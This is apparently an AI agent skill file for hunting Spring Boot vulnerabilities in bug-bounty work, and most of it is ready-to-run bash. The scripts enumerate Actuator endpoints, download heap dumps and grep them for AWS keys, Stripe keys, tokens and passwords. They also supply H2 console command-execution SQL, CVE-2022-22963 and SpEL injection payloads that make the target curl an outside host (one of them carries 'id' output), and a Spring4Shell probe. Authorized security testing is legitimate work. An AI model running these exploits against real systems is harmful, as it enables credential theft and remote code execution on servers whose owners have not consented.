---
name: k1nzr3c0n-hunt-springboot
description: "Hunt Spring Boot vulnerabilities. Crown jewels: /actuator/heapdump (JVM heap = all secrets in memory), /actuator/env (env vars + passwords), /actuator/shutdown (DoS), H2 console RCE (CREATE ALIAS trick), SpEL injection → RCE, Spring4Shell CVE-2022-22965, Spring Cloud Function CVE-2022-22963, Jolokia JMX exposure."
tags: [springboot, actuator, spel, rce, java, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Spring Boot

> **Heapdump = Critical**: JVM heap contains plaintext passwords, tokens, DB creds, private keys.
> **Detect**: X-Application-Context header, Whitelabel Error Page, /actuator response.

---

## Phase 0 — Fingerprint Spring Boot

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_spring_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== Spring Boot Fingerprinting ==="
curl -sI "https://${TARGET}/" | grep -iE 'x-application-context|x-powered-by|server:' | sed 's/^/  /'

# Whitelabel Error Page
curl -s "https://${TARGET}/nonexistent-path-xyz" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework" | head -3 | sed 's/^/  /'

# Actuator root
echo ""
echo "=== Actuator Detection ==="
for BASE in "" "/manage" "/management" "/app" "/admin" "/monitoring"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${BASE}/actuator")
  [ "$CODE" = "200" ] && echo "  [FOUND] Actuator at: ${TARGET}${BASE}/actuator"
done
```

## Phase 1 — Actuator Endpoint Enumeration

```bash
echo "=== Actuator Endpoint Hunt ==="
ACTUATOR_BASE="${ACTUATOR_BASE:-https://${TARGET}/actuator}"

ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics"
  "loggers" "info" "health" "configprops" "shutdown" "trace"
  "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
  "flyway" "liquibase" "refresh" "restart" "jolokia")

for EP in "${ENDPOINTS[@]}"; do
  BODY=$(curl -sk -H "Accept: application/json" "${ACTUATOR_BASE}/${EP}" 2>/dev/null)
  CT=$(curl -sk -o /dev/null -w "%{content_type}" -H "Accept: application/json" "${ACTUATOR_BASE}/${EP}" 2>/dev/null)
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${ACTUATOR_BASE}/${EP}" 2>/dev/null)
  
  if [ "$CODE" = "200" ] && echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel\|<html"; then
    echo "  [EXPOSED $CODE] ${ACTUATOR_BASE}/${EP}"
    echo "$BODY" | grep -i "password\|secret\|key\|token\|credential" | head -3 | sed 's/^/    SECRET: /'
  fi
done

echo ""
echo "High-value: get all mappings (full API surface):"
curl -sk "${ACTUATOR_BASE}/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern":"\K[^"]+' | sort
```

## Phase 2 — Heap Dump Analysis

```bash
echo "=== Heap Dump Download + Analysis ==="
ACTUATOR_BASE="${ACTUATOR_BASE:-https://${TARGET}/actuator}"

echo "Downloading heapdump (may be 100MB+)..."
curl -sk "${ACTUATOR_BASE}/heapdump" -o /tmp/heapdump.hprof
ls -lh /tmp/heapdump.hprof 2>/dev/null

echo ""
echo "Quick secret extraction:"
strings /tmp/heapdump.hprof 2>/dev/null | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
  grep -vE "^[a-z_]" | sort -u | head -30

echo ""
echo "Targeted patterns:"
strings /tmp/heapdump.hprof 2>/dev/null | grep -oP "AKIA[A-Z0-9]{16}" | sort -u | sed 's/^/  [AWS-KEY] /'
strings /tmp/heapdump.hprof 2>/dev/null | grep -oP "sk_live_[A-Za-z0-9]+" | sort -u | sed 's/^/  [STRIPE] /'
strings /tmp/heapdump.hprof 2>/dev/null | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u | head -5 | sed 's/^/  [BEARER] /'
strings /tmp/heapdump.hprof 2>/dev/null | grep -oP "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -10 | sed 's/^/  [PASS] /'
```

## Phase 3 — H2 Console RCE

```bash
echo "=== H2 Console Detection + RCE ==="
for PATH_H2 in /h2-console /h2 /console /database; do
  BODY=$(curl -sk "https://${TARGET}${PATH_H2}")
  echo "$BODY" | grep -qi "H2 Console\|H2 Database\|H2 Web" && \
    echo "  [FOUND] H2 Console at: ${PATH_H2}"
done

echo ""
echo "Default credentials: sa / (empty password)"
echo "JDBC URL: jdbc:h2:mem:testdb"
echo ""
echo "RCE via SQL (if accessible):"
cat << 'SQL'
-- Create Java alias to execute OS commands
CREATE ALIAS EXEC AS $$
String exec(String cmd) throws Exception {
  Runtime rt = Runtime.getRuntime();
  Process proc = rt.exec(new String[]{"sh","-c",cmd});
  return new String(proc.getInputStream().readAllBytes());
} $$;

-- Execute
CALL EXEC('id');
CALL EXEC('curl http://OOB_HOST/h2-rce');
SQL
```

## Phase 4 — SpEL Injection

```bash
echo "=== SpEL Injection ==="
BASE="https://${TARGET}"

echo "Test: #{7*7} or \${7*7} in user-controlled fields"
echo "If response reflects 49 → SpEL is being evaluated → RCE possible"
echo ""

# Basic test
curl -sk -X POST "${BASE}/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{7*7}"}' | grep -o '49' | head -1 | sed 's/^/  [SPEL-MATH] /'

# CVE-2022-22963 — Spring Cloud Function
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"
echo ""
echo "CVE-2022-22963 (Spring Cloud Function SpEL):"
curl -sk -X POST "${BASE}/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl http://${OOB}/spel-rce\")" \
  -d "test" -o /dev/null -w "  HTTP: %{http_code}\n"
echo "  Check OOB: ${OOB}"

echo ""
echo "Generic SpEL RCE (OOB — exec() returns Process, not String, so no direct output):"
echo '  {"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl OOB/spel-$(id|base64)\"})}"}'
```

## Phase 5 — Spring4Shell (CVE-2022-22965)

```bash
echo "=== Spring4Shell CVE-2022-22965 ==="
echo "Affects: Spring Framework < 5.3.18 and < 5.2.20 + JDK 9+ + WAR on Tomcat"
echo ""
echo "Detection — does app accept class.* parameters?"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"
curl -sk "https://${TARGET}/api/user" \
  -d "class.module.classLoader.URLs[0]=jar:http://${OOB}/test.jar!/" \
  -o /dev/null -w "  HTTP: %{http_code}\n"
echo "  Check OOB for HTTP callback — if received → likely vulnerable"
echo ""
echo "For full exploitation payload, see:"
echo "  https://github.com/BobTheShoplifter/Spring4Shell-POC"
```

## Gate 0

```bash
echo "=== Spring Boot Gate 0 ==="
echo "  □ Heapdump: strings extracts passwords/tokens from .hprof"
echo "  □ Actuator/env: secrets visible in JSON response"
echo "  □ H2 console: accessible + SQL executes"
echo "  □ SpEL: 7*7=49 reflected OR OOB callback received"
echo "  □ Spring4Shell: OOB HTTP callback confirmed on class.* injection"
echo "  □ CVE-2022-22963: HTTP callback from functionRouter header"
echo ""
echo "  SEVERITY: Heapdump w/ creds=Critical | SpEL RCE=Critical | /actuator/env=High"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Spring Boot Actuator /actuator/heapdump exposed on [target.com]: 145MB heap dump downloaded; strings extraction reveals DB_PASSWORD=prod_secret, AWS_SECRET_ACCESS_KEY=AKIA..., 3 bearer tokens — Critical credential exposure
SpEL injection on [/api/render]: #{7*7} evaluates to 49; OOB HTTP callback at rce.oastify.com confirms OS command execution via T(Runtime).exec() — Critical RCE
CVE-2022-22963 (Spring Cloud Function): spring.cloud.function.routing-expression header accepts SpEL → confirmed RCE via OOB callback
```
